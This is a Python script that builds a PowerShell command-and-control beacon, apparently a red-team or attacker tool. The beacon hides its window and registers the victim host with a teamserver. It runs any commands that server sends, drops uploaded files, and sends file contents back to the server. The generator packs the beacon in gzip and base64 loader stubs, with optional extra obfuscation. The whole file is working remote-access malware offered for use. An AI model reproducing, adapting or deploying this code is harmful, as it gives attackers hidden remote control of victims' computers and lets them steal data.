import argparse
import base64
import gzip
from pathlib import Path
from io import BytesIO

# --- PowerShell beacon template ---
BEACON_TEMPLATE = r'''
# PowerShell Beacon Client
# Author: WebDragon63

param ()

$TEAMSERVER_URL = "{url}"
$SLEEP_INTERVAL = {interval}
$STAGER_KEY = "{key}"
$BEACON_ID = [guid]::NewGuid().ToString()
$Global:CurrentDirectory = (Get-Location).Path

function Hide-Console {{
    try {{
        $consoleWindow = Get-Process -Id $PID | ForEach-Object {{ $_.MainWindowHandle }}
        $null = Add-Type -MemberDefinition @"
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@ -Name "WinAPI" -Namespace "Console" -PassThru
        [Console.WinAPI]::ShowWindow($consoleWindow, 0)
    }} catch {{}}
}}

function Get-LanIP {{
    try {{
        $client = New-Object System.Net.Sockets.UdpClient
        $client.Connect("8.8.8.8", 80)
        ($client.Client.LocalEndPoint.ToString().Split(':')[0])
    }} catch {{
        "127.0.0.1"
    }}
}}

function Get-SystemInfo {{
    @{{
        id       = $BEACON_ID
        hostname = $env:COMPUTERNAME
        os       = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
        arch     = (Get-CimInstance Win32_Processor).Architecture
        ip       = Get-LanIP
        key      = $STAGER_KEY
    }}
}}

function Register {{
    try {{
        $info = Get-SystemInfo
        $json = $info | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "$TEAMSERVER_URL/register" -Method POST -Body $json -ContentType "application/json" | Out-Null
    }} catch {{}}
}}

function Execute-Task($task) {{
    $type = $task.type
    $command = $task.command
    switch ($type) {{
        "cmd" {{
            if ($command -like "cd *") {{
                $pathArg = $command.Substring(3).Trim("`"","'")
                if (-not $pathArg) {{
                    return $Global:CurrentDirectory
                }}
                try {{
                    $resolvedPath = if ([System.IO.Path]::IsPathRooted($pathArg)) {{
                        Resolve-Path -Path $pathArg -ErrorAction Stop
                    }} else {{
                        Resolve-Path -Path (Join-Path $Global:CurrentDirectory $pathArg) -ErrorAction Stop
                    }}

                    if (Test-Path $resolvedPath -PathType Container) {{
                        $Global:CurrentDirectory = $resolvedPath.Path
                        return "[+] Changed directory to $($Global:CurrentDirectory)"
                    }} else {{
                        return "[-] Not a directory: $resolvedPath"
                    }}
                }} catch {{
                    return "[-] Failed to change directory: $_"
                }}
            }}

            try {{
                Push-Location -Path $Global:CurrentDirectory
                $result = Invoke-Expression -Command $command 2>&1 | Out-String
                Pop-Location
                return $result.Trim()
            }} catch {{
                Pop-Location
                return $_.Exception.Message
            }}
        }}

        "upload" {{
            try {{
                $dst = $task.dst
                $fullPath = Join-Path $Global:CurrentDirectory $dst
                $data = [System.Convert]::FromBase64String($task.data)
                [IO.File]::WriteAllBytes($fullPath, $data)
                return "[+] File uploaded to $fullPath"
            }} catch {{
                return "[-] Upload failed: $_"
            }}
        }}

        "download" {{
            try {{
                $path = Join-Path $Global:CurrentDirectory $task.path
                $bytes = [IO.File]::ReadAllBytes($path)
                return [Convert]::ToBase64String($bytes)
            }} catch {{
                return "[-] Download failed: $_"
            }}
        }}

        default {{
            return "[-] Unknown task type"
        }}
    }}
}}

function Post-Result($taskId, $result) {{
    try {{
        $payload = @{{
            id      = $BEACON_ID
            task_id = $taskId
            result  = $result
            key     = $STAGER_KEY
        }}
        $json = $payload | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "$TEAMSERVER_URL/result" -Method POST -Body $json -ContentType "application/json" | Out-Null
    }} catch {{}}
}}

function Check-In {{
    try {{
        $params = @{{
            id  = $BEACON_ID
            key = $STAGER_KEY
        }}
        $query = ($params.GetEnumerator() | ForEach-Object {{ "$($_.Key)=$($_.Value)" }}) -join "&"
        $url = "$TEAMSERVER_URL/task?$query"

        $response = Invoke-RestMethod -Uri $url -Method GET -ErrorAction Stop

        if ($response) {{
            $result = Execute-Task $response
            Post-Result $response.task_id $result
        }}
    }} catch {{
        if ($_.Exception.Response.StatusCode.value__ -eq 404) {{
            Register
        }}
    }}
}}

function Main {{
    Hide-Console
    Register
    while ($true) {{
        Check-In
        Start-Sleep -Seconds $SLEEP_INTERVAL
    }}
}}

Main
'''

# --- Loader stub ---
LOADER_TEMPLATE = r'''
$p = "{b64}"
$bytes = [Convert]::FromBase64String($p)
$ms = New-Object IO.MemoryStream(,$bytes)
$gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($gz)
$script = $sr.ReadToEnd()
Invoke-Expression $script
'''.strip()

def compress_gzip_compatible(data: bytes) -> bytes:
    buffer = BytesIO()
    with gzip.GzipFile(fileobj=buffer, mode="wb", compresslevel=9, mtime=0) as f:
        f.write(data)
    return buffer.getvalue()

def generate_loader(url: str, interval: int, key: str) -> str:
    beacon = BEACON_TEMPLATE.format(url=url, interval=interval, key=key)
    compressed = compress_gzip_compatible(beacon.encode("utf-8"))
    b64 = base64.b64encode(compressed).decode()
    return LOADER_TEMPLATE.format(b64=b64)

def obfuscate_script(script: str) -> str:
    encoded = base64.b64encode(script.encode("utf-8")).decode()
    return f'$e="{encoded}";IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e)))'

def main():
    parser = argparse.ArgumentParser(description="PowerShell Beacon Generator with optional full obfuscation")
    parser.add_argument("url", help="Teamserver URL")
    parser.add_argument("--interval", type=int, default=5, help="Beacon sleep interval")
    parser.add_argument("--key", required=True, help="Stager key")
    parser.add_argument("--obfuscate", action="store_true", help="Wrap entire loader in base64")
    parser.add_argument("-o", "--output", help="Output PowerShell file")

    args = parser.parse_args()
    script = generate_loader(args.url, args.interval, args.key)

    if args.obfuscate:
        script = obfuscate_script(script)

    output_path = Path(args.output) if args.output else Path("build/beacon/ps_beacon.ps1")
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(script, encoding="utf-8")
    print(f"[+] Beacon saved to: {output_path}")

if __name__ == "__main__":
    main()
